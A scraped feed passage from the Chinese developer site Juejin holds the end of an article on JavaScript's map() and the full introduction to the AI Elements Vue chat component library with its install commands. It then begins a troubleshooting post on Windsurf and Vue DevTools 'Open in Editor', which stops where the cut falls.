<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 可复用的转换函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">toUpperCase</span> = str =&gt; str.<span class="hljs-title function_">toUpperCase</span>();
<span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = x =&gt; x + <span class="hljs-number">1</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">activeUsers</span> = users =&gt; users.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">active</span>);

<span class="hljs-comment">// 组合使用</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">processUsers</span> = users =&gt; <span class="hljs-title function_">activeUsers</span>(users)
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> ({
    ...user,
    <span class="hljs-attr">name</span>: <span class="hljs-title function_">toUpperCase</span>(user.<span class="hljs-property">name</span>),
    <span class="hljs-attr">age</span>: <span class="hljs-title function_">increment</span>(user.<span class="hljs-property">age</span>)
  }));
</code></pre>
<h3 data-id="heading-20">结论：为什么 map() 如此重要</h3>
<p><code>map()</code> 的重要性远超出其作为数组方法的实用价值。它代表了一种编程范式：</p>
<ol>
<li><strong>声明式思维</strong>：关注"做什么"而非"怎么做"</li>
<li><strong>不可变性</strong>：避免副作用，使代码更可预测</li>
<li><strong>函数组合</strong>：构建复杂系统从小而纯的函数开始</li>
<li><strong>数据转换</strong>：以数据流的方式思考问题</li>
</ol>
<p>当我们真正理解 <code>map()</code>，我们不仅仅学会了一个 JavaScript 方法，而是拥抱了一种更清晰、更可维护、更优雅的编程哲学。</p>
<p>下次当你使用 <code>map()</code> 时，记得你不仅仅是在转换数组——你是在实践一种经过数学验证、被函数式编程社区推崇的思维方式。这才是 <code>map()</code> 方法的真正深度所在。</p>
<hr/>
<p><em>"我们不是在学习一个方法，而是在拥抱一种思维方式。"</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Elements Vue，帮助你更快的构建 AI 应用程序]]></title>    <link>https://juejin.cn/post/7576057623741906986</link>    <guid>https://juejin.cn/post/7576057623741906986</guid>    <pubDate>2025-11-24T07:58:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576057623741906986" data-draft-id="7574972697676677156" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Elements Vue，帮助你更快的构建 AI 应用程序 "/> <meta itemprop="keywords" content="前端,ChatGPT,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T07:58:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CharlieWang"/> <meta itemprop="url" content="https://juejin.cn/user/3597257776568920"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Elements Vue，帮助你更快的构建 AI 应用程序 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3597257776568920/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CharlieWang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:58:02.000Z" title="Mon Nov 24 2025 07:58:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{font-family:-apple-system,system-ui,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial;color:#00325e}.markdown-body ::selection{background-color:#00325e;color:#fff}.markdown-body blockquote{padding:10px 20px;background-color:#fffaf0;box-shadow:0 3px 10px 0 rgba(255,172,194,.24);border:1px solid #f3ca8e;transition:all .2s;margin:1em 0;border-radius:5px}.markdown-body blockquote p{font-size:14px;line-height:25px;color:#795548}.markdown-body blockquote p:last-child{margin:0}.markdown-body blockquote:hover{border-color:#ff9800;background-color:#fff8e0;box-shadow:0 6px 10px -5px rgba(225,173,98,.3803921569)}.markdown-body blockquote code{color:#ff502c}.markdown-body pre{border:1px solid #8cc0f3;box-shadow:0 3px 10px 0 rgba(255,198,198,.28);border-radius:5px;transition:all .2s;overflow-x:auto;white-space:pre-wrap}.markdown-body pre:hover{border-color:#6d9dce}.markdown-body pre&gt;code{padding:10px 20px;color:#00325e;background:#f0f8ff;font-size:12px;line-height:1.6;display:block}.markdown-body code{background:#f6fbff;color:#0b5393;padding:2px 4px;border-radius:4px;font-size:12px}.markdown-body p{font-size:14px;line-height:28px;text-align:justify;margin-bottom:17px;color:#595959}.markdown-body a{color:#00325e;text-decoration:none}.markdown-body a:after{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAQdJREFUKFNt0DtLA0EUBeBzZle0Eks7rcUfEfBRCha7NorYa6NmVJzgyi4smUgKtdZGCJktLMVH4Y8QeztLWyE7VyLEuNFbXj4Oh0P8c8mZm+uJrEN4BJFTeP/MUVe3bnocfALwkOlo1zS7iZAzf6Cx7oXgbaqjxiDEWCcVaGyxQ8pSWo9XhqhoQ/xUFbaKjhe5V+CmR7mnSplEEF6GSmJ+F/d0KHvbCIIJCLc85U6BC5mONgbJNM3uFag++sX7z8O8MzsWBucifMx0dDGE1kmm458KDVukAlnNdDz/exEeW3dNkbfsYC0xtmgDWP6ELLZ0/F6BJu/UoFQN5AkoeUjeJPvx6+i+X5Sjah4tA6gYAAAAAElFTkSuQmCC);margin-left:2px}.markdown-body a:hover{box-shadow:0 1px}.markdown-body table{max-width:100%;border-collapse:collapse;border-spacing:0;box-shadow:0 3px 10px 0 rgba(255,238,172,.24);transition:all .2s}.markdown-body table:hover{box-shadow:0 3px 10px 0 rgba(185,169,103,.24)}.markdown-body table tr th{border:1px solid #8cc0f3;background-color:#f0f8ff;padding:12px 15px}.markdown-body table tr td{border:1px solid rgba(243,202,142,.4);padding:12px 15px}.markdown-body table tbody tr{transition:all .2s}.markdown-body table tbody tr:hover td{border-color:#f3ca8e;background-color:#fff8e0;z-index:1}.markdown-body img{max-width:100%}.markdown-body h1{font-size:20px;margin-top:30px;margin-bottom:10px;padding-left:30px;position:relative}.markdown-body h1&gt;code{font-size:20px}.markdown-body h1:before{content:"🍺";display:block;font-size:18px;width:18px;height:18px;left:0;position:absolute}.markdown-body h2{font-size:18px;margin-top:30px;margin-bottom:10px;padding-left:28px;position:relative}.markdown-body h2&gt;code{font-size:18px}.markdown-body h2:before{content:"🍻";display:block;font-size:16px;width:16px;height:16px;left:0;position:absolute}.markdown-body h3{font-size:16px;margin-top:30px;margin-bottom:10px;padding-left:26px;position:relative}.markdown-body h3&gt;code{font-size:16px}.markdown-body h3:before{content:"🥂";display:block;font-size:14px;width:14px;height:14px;left:0;position:absolute}.markdown-body h4{font-size:14px;margin-top:30px;margin-bottom:10px;padding-left:24px;position:relative}.markdown-body h4&gt;code{font-size:14px}.markdown-body h4:before{content:"🥃";display:block;font-size:12px;width:12px;height:12px;left:0;position:absolute}.markdown-body h5{font-size:12px;margin-top:30px;margin-bottom:10px}.markdown-body h5&gt;code{font-size:12px}.markdown-body h6{font-size:10px;margin-top:30px;margin-bottom:10px}.markdown-body h6&gt;code{font-size:10px}.markdown-body h1,.markdown-body h2{color:#ff502c}.markdown-body hr{height:4px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#6d9dce,#8cc0f3 25%,transparent 50%)}.markdown-body hr:nth-child(2n){background-image:linear-gradient(270deg,#ff9800,#fff8e0 25%,transparent 50%)}.markdown-body ul{padding-inline-start:20px}.markdown-body ul li{list-style-type:"🔸"}.markdown-body ul li li{list-style-type:"◻️"}.markdown-body ul li li li{list-style-type:"▫️"}.markdown-body ol{padding-inline-start:20px}.markdown-body ol ::marker{color:#ff9800}.markdown-body ol,.markdown-body ul{line-height:2em}.markdown-body li{padding-inline-start:1ch}.markdown-body li.task-list-item{list-style:none;padding-inline-start:0}.markdown-body li input{padding-right:2px}.markdown-body li input[type=checkbox i]{appearance:none}.markdown-body li input:before{content:"🟩";display:block;width:13px;height:13px}.markdown-body li input:checked:before{content:"✅"}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1a0685acd9a4d45b37977311dbf8aa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2hhcmxpZVdhbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764575994&amp;x-signature=6qIGngLjl6t8tFZOVvGWRqKRkd8%3D" alt="image.png" loading="lazy"/></p>
<p>大家好，我是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvue-zone%2Fvue3-vant-mobile" target="_blank" title="https://github.com/vue-zone/vue3-vant-mobile" ref="nofollow noopener noreferrer">vue3-vant-mobile</a> 的作者，也是多个 Vue 社区项目的长期<a href="https://link.juejin.cn?target=https%3A%2F%2Fprs.devv.zone%2F" target="_blank" title="https://prs.devv.zone/" ref="nofollow noopener noreferrer">贡献者</a>。</p>
<p>最近两个月我主要在折腾一个新项目：<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuepont%2Fai-elements-vue" target="_blank" title="https://github.com/vuepont/ai-elements-vue" ref="nofollow noopener noreferrer">AI Elements Vue</a>，一个面向 AI Chatbot 场景的 Vue 组件库</strong>。</p>
<p>这个项目曾上过阮一峰老师的科技周刊，算是被认真看过的一次。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1a55537ad4d48208bf2264be26600b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2hhcmxpZVdhbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764575994&amp;x-signature=pTGRnIILNRpiv47N8nGY%2FJqRbVk%3D" alt="image.png" loading="lazy"/></p>
<p>很多前端都有做组件库的想法，我也是一样，只是这次做的方向稍微有点不一样。</p>
<p>它基于 <code>shadcn-vue</code> 和 <code>tailwindcss</code>，同时配了一套自己的注册表服务，所有组件从我们自己的注册表中获取。</p>
<p>最早在 <code>shadcn-vue</code> 支持自定义注册表时，我就在琢磨做一套 Chat 组件库了，再加上我一直在写各种 chat 相关组件。直到我在 Vercel 看到了 <code>ai-elements</code> 项目，干脆不再犹豫——于是就有了完全对标的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuepont%2Fai-elements-vue" target="_blank" title="https://github.com/vuepont/ai-elements-vue" ref="nofollow noopener noreferrer">AI Elements Vue</a>。</p>
<p>简单讲，<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuepont%2Fai-elements-vue" target="_blank" title="https://github.com/vuepont/ai-elements-vue" ref="nofollow noopener noreferrer">AI Elements Vue</a> 是一组围绕聊天场景做扩展的组件集合</strong>，但还是沿用 shadcn 的那套设计和工具链。</p>
<p>这意味着你能享受到 shadcn 的全部优点：</p>
<ul>
<li><strong>高可定制</strong>：样式和交互都能深度改造</li>
<li><strong>按需引入</strong>：按需引入，用多少拿多少</li>
<li><strong>完全透明</strong>：所有组件都可以修改，而不是黑盒封装</li>
</ul>
<p>和社区里已有的 ant-design-vue-x、element-plus-x 等 AI 组件库相比，我们是从 shadcn 体系出发，在同一套设计系统和工具链上扩展 AI 场景组件。</p>
<p>除了常规的聊天窗口，我们也做了很多你在 ChatGPT、Cursor 里常见的那种交互形态，对应的组件基本都能找到。这也是叫「AI 元素」的原因——更像是一盒可以随手拼搭的积木。</p>
<p>另外，我们还提供了 MCP 服务，你在项目里接不同家的模型和服务时，会省不少时间。</p>
<p>下面是目前已经有的组件列表，后面也会根据大家的反馈慢慢往上加。</p>

















































































































































<table><thead><tr><th>组件</th><th>描述</th></tr></thead><tbody><tr><td><strong>Chatbot</strong></td><td/></tr><tr><td><code>actions</code></td><td>AI 回复的交互操作按钮</td></tr><tr><td><code>branch</code></td><td>会话流程的分支可视化</td></tr><tr><td><code>chain-of-thought</code></td><td>展示 AI 的推理链路和思考过程</td></tr><tr><td><code>code-block</code></td><td>带语法高亮与复制功能的代码显示</td></tr><tr><td><code>context</code></td><td>展示上下文消耗情况</td></tr><tr><td><code>conversation</code></td><td>聊天会话的容器组件</td></tr><tr><td><code>image</code></td><td>AI 生成图片的展示组件</td></tr><tr><td><code>inline-citation</code></td><td>行内来源引用</td></tr><tr><td><code>loader</code></td><td>AI 操作的加载状态</td></tr><tr><td><code>message</code></td><td>带头像的单条聊天消息</td></tr><tr><td><code>open-in-chat</code></td><td>将消息在聊天中打开的按钮</td></tr><tr><td><code>plan</code></td><td>计划与任务规划展示组件</td></tr><tr><td><code>prompt-input</code></td><td>带模型选择的高级输入组件</td></tr><tr><td><code>queue</code></td><td>支持附件的消息与待办队列</td></tr><tr><td><code>reasoning</code></td><td>展示 AI 推理和思考过程</td></tr><tr><td><code>response</code></td><td>格式化的 AI 回复展示</td></tr><tr><td><code>shimmer</code></td><td>文字闪烁炫光效果</td></tr><tr><td><code>sources</code></td><td>来源引用展示</td></tr><tr><td><code>suggestion</code></td><td>快捷操作建议</td></tr><tr><td><code>task</code></td><td>任务完成进度跟踪</td></tr><tr><td><code>tool</code></td><td>工具使用可视化</td></tr><tr><td><code>confirmation</code></td><td>工具执行前的确认流程</td></tr><tr><td><strong>Vibe-Coding</strong></td><td/></tr><tr><td><code>artifact</code></td><td>展示代码或文档的容器</td></tr><tr><td><code>web-preview</code></td><td>内嵌网页预览</td></tr><tr><td><strong>Workflow</strong></td><td/></tr><tr><td><code>canvas</code></td><td>用于工作流可视化的 VueFlow 画布</td></tr><tr><td><code>connection</code></td><td>工作流连线组件</td></tr><tr><td><code>controls</code></td><td>画布控制（缩放、适配视图等）</td></tr><tr><td><code>edge</code></td><td>连接工作流节点的边组件</td></tr><tr><td><code>node</code></td><td>工作流图的节点组件</td></tr><tr><td><code>panel</code></td><td>画布覆盖层面板组件</td></tr><tr><td><code>toolbar</code></td><td>工作流节点的工具栏</td></tr></tbody></table>
<p>下面说说使用，有一些必要的前提条件。</p>
<ul>
<li>你需要先安装 <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fdownload%2F" target="_blank" title="https://nodejs.org/en/download/" ref="nofollow noopener noreferrer">Node.js</a> 18 或以上版本。</li>
<li>AI Elements Vue 基于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fshadcn-vue.com%2F" target="_blank" title="https://shadcn-vue.com/" ref="nofollow noopener noreferrer">shadcn-vue</a>, 所以你需要先安装 shadcn-vue，以及设置好 tailwindcss。</li>
<li>最后安装 <a href="https://link.juejin.cn?target=https%3A%2F%2Fai-sdk.dev%2F" target="_blank" title="https://ai-sdk.dev/" ref="nofollow noopener noreferrer">AI SDK</a>, 因为组件会用到 AI SDK。</li>
</ul>
<p>我们有自己的注册表和cli，你可以直接使用我们的cli安装组件，也可以使用shadcn-vue的cli安装组件。</p>
<p>比如使用我们的 cli 安装 message 组件:</p>
<pre><code class="hljs language-bash" lang="bash">npx ai-elements-vue@latest add message
</code></pre>
<p>或者使用 shadcn-vue 的 cli 安装 message 组件:</p>
<pre><code class="hljs language-bash" lang="bash">npx shadcn-vue@latest add https://registry.ai-elements-vue.com/message.json
</code></pre>
<p>你也可以一次性安装所有组件：</p>
<pre><code class="hljs language-bash" lang="bash">npx ai-elements-vue@latest
</code></pre>
<p>是不是比较方便。生成的组件会和 shadcn-vue 的组件一样，被放在了 components/ui 目录下。</p>
<blockquote>
<p>目前 AI Elements Vue 的组件会放置在 components/ai-elements 目录下，未来会移动到 components/ui 目录下。</p>
</blockquote>
<p>然后你可以结合其它 AI 组件库直接在组件中使用，比如：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="h-[498px] rounded-xl border"&gt;
    &lt;Conversation class="relative h-full"&gt;
      &lt;ConversationContent class="space-y-2"&gt;
        &lt;Message v-for="(m, idx) in visibleMessages" :key="m.key" :from="idx % 2 === 0 ? 'user' : 'assistant'"&gt;
          &lt;MessageContent&gt;{{ m.value }}&lt;/MessageContent&gt;
          &lt;MessageAvatar :src="m.avatar" :name="m.name" /&gt;
        &lt;/Message&gt;
      &lt;/ConversationContent&gt;
      &lt;ConversationScrollButton /&gt;
    &lt;/Conversation&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p>下周，我们将发布 <code>v1</code> 版本, 主要是更新文档和增加示例，并修复一些已知问题。</p>
<p>最后，欢迎大家来试用 AI Elements Vue，并提出建议和反馈。如果大家喜欢，请给个 star 支持一下，谢谢。</p>
<ul>
<li><code>AI Elements Vue</code> 文档地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fai-elements-vue.com" target="_blank" title="https://ai-elements-vue.com" ref="nofollow noopener noreferrer">ai-elements-vue.com</a></li>
<li><code>AI Elements Vue</code> 项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuepont%2Fai-elements-vue" target="_blank" title="https://github.com/vuepont/ai-elements-vue" ref="nofollow noopener noreferrer">github.com/vuepont/ai-…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[彻底解决 Windsurf 在 Vue DevTools 无法精准定位的问题]]></title>    <link>https://juejin.cn/post/7575910298282770467</link>    <guid>https://juejin.cn/post/7575910298282770467</guid>    <pubDate>2025-11-24T07:57:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910298282770467" data-draft-id="7575457788665331764" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="彻底解决 Windsurf 在 Vue DevTools 无法精准定位的问题"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T07:57:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="凯哥1970"/> <meta itemprop="url" content="https://juejin.cn/user/3954283342211335"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            彻底解决 Windsurf 在 Vue DevTools 无法精准定位的问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3954283342211335/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    凯哥1970
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:57:16.000Z" title="Mon Nov 24 2025 07:57:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近来白嫖 Windsurf 时，我试图将 Vue DevTools 的 <code>Open in Editor</code> 功能配置为 Windsurf 时，可能会遇到一个非常恼人的“水土不服”现象：</p>
<p>点击浏览器中的组件时，编辑器虽然被唤起了，但<strong>光标没有定位到具体的代码行</strong>，反而<strong>多打开了两个以数字命名的空文件</strong>（例如名为 <code>40</code> 和 <code>12</code> 的文件）。</p>
<h2 data-id="heading-0">1. 根本原因：一次尴尬的“跨服聊天”</h2>
<p>这个问题的根源在于 Vue DevTools 背后的启动器 <code>launch-editor</code> 和 Windsurf 之间的沟通协议不匹配。</p>
<p>当插件装好启动时，在 Chrome 或 Edge 浏览器的 Vue DevTools 面板中点击组件名称，或者在页面覆盖层（Overlay）点击 DOM 元素时，DevTools 客户端代码会构建一个 HTTP 请求 。   </p>
<p>该请求通常遵循以下 URL 模式：</p>
<p>HTTP</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable constant_">GET</span> /__open-<span class="hljs-keyword">in</span>-editor?file=<span class="hljs-regexp">/Users/dev</span><span class="hljs-regexp">/project/src</span><span class="hljs-regexp">/components/</span><span class="hljs-title class_">Header</span>.vue&amp;line=<span class="hljs-number">42</span>&amp;column=<span class="hljs-number">15</span>
</code></pre>
<p>这里的关键参数包括：</p>
<ul>
<li><strong>file</strong>: 目标文件的绝对路径。</li>
<li><strong>line</strong>: 目标行号（通常从 1 开始）。</li>
<li><strong>column</strong>: 目标列号（通常从 1 开始）。</li>
</ul>
